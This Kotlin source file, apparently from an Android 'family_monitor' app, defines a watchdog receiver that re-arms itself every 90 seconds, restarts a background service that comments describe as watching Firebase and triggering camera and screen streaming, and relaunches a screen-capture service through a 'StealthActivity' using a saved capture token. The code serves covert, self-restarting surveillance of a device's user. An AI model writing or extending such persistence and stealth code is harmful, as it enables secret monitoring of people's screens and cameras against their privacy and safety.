package com.example.family_monitor

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class WatchdogReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG      = "WatchdogReceiver"
        const val ACTION_WATCHDOG  = "com.example.family_monitor.ACTION_WATCHDOG"
        private const val REQ      = 7777
        private const val INTERVAL = 90_000L   // 90 s

        fun schedule(context: Context) {
            val am = context.getSystemService(AlarmManager::class.java)
            val pi = pi(context)
            val trigger = System.currentTimeMillis() + INTERVAL
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
                else
                    am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi)
            } catch (_: Exception) {
                am.set(AlarmManager.RTC_WAKEUP, trigger, pi)
            }
            Log.d(TAG, "Watchdog scheduled in ${INTERVAL / 1000}s")
        }

        private fun pi(ctx: Context) = PendingIntent.getBroadcast(
            ctx, REQ,
            Intent(ctx, WatchdogReceiver::class.java).apply { action = ACTION_WATCHDOG },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_WATCHDOG) return
        Log.d(TAG, "Watchdog fired — service instance=${ScreenCaptureService.instance != null}")

        // ── 1. Always ensure the Flutter background service is running ──
        // This is the primary monitoring process. It watches Firebase and
        // triggers camera/screen streaming. Restarting it here covers the
        // case where Android killed it to reclaim memory.
        try {
            val bgSvc = Intent(
                context,
                id.flutter.flutter_background_service.BackgroundService::class.java
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(bgSvc)
            else
                context.startService(bgSvc)
            Log.d(TAG, "Flutter background service (re)started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart bg service: $e")
        }

        // ── 2. Restart ScreenCaptureService if it died ──────────────────
        if (ScreenCaptureService.instance == null) {
            val hasSavedToken = ScreenCaptureService.savedResultCode != 0 &&
                                ScreenCaptureService.savedResultData != null
            // On Android 12+ (API 31+) starting activities from the background requires
            // FLAG_ACTIVITY_NEW_TASK and the app must be on the foreground exception list.
            // The watchdog alarm fires while the app is in the background, so on API 31+
            // we only attempt the launch — the system will silently drop it if not allowed,
            // which is preferable to crashing via RemoteServiceException.
            if (hasSavedToken) {
                try {
                    context.startActivity(
                        Intent(context, StealthActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                                     Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        }
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start StealthActivity: $e")
                }
            } else {
                try {
                    context.packageManager
                        .getLaunchIntentForPackage(context.packageName)
                        ?.apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                                           Intent.FLAG_ACTIVITY_SINGLE_TOP) }
                        ?.let { context.startActivity(it) }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open main app: $e")
                }
            }
        }
        schedule(context)   // re-arm
    }
}
